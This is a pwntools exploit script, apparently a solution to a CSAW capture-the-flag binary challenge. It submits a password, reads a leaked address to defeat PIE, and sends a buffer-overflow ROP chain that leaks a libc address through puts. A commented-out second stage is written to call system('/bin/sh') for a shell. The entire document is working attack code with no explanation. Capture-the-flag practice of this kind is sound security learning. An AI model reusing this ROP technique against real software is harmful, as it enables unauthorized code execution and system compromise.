from pwn import *
from time import sleep
pw= '8d16635db965bc4e0a97521e8105fad2'

p = process('./lol.bin')
#p = remote("auto-pwn.chal.csaw.io", 11001)
#pid = gdb.attach(p, gdbscript="""
        
 #       b * runChallenge
  #      """)



#parse it
p.sendlineafter('> ',pw)
#sleep(1)
p.recvuntil('\nMain is at ')
#sleep(2)
main = int(p.recvline().replace('\n',''),16)
print('main: ',hex(main))

base = main - 0x1421
print("base: ",hex(base))
run_chall = main  -0x20
pop_rdi_ret=0x00000000000012f2 + base
puts_got = 0x3fa0 + base
puts_plt = 0x0010f0 + base
ret = 0x000000000000101a + base

#rop leak libc

padd = "A"*9

payload = padd
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(run_chall)
#p.recv(100)
p.sendline(payload)

#libc_puts = u64(p.recv(6).ljust(8,'\0'))

#print('libc_puts: ',hex(libc_puts))
#system = libc_puts -0x29b10
#bin_sh = libc_puts +0xf8c89

#payload2 = padd
#payload2 += p64(pop_rdi_ret)
#payload2 += p64(bin_sh)
#payload2 += p64(ret)
#payload2 += p64(system)
#p.recv(100)
#p.sendline(payload2)
p.interactive()
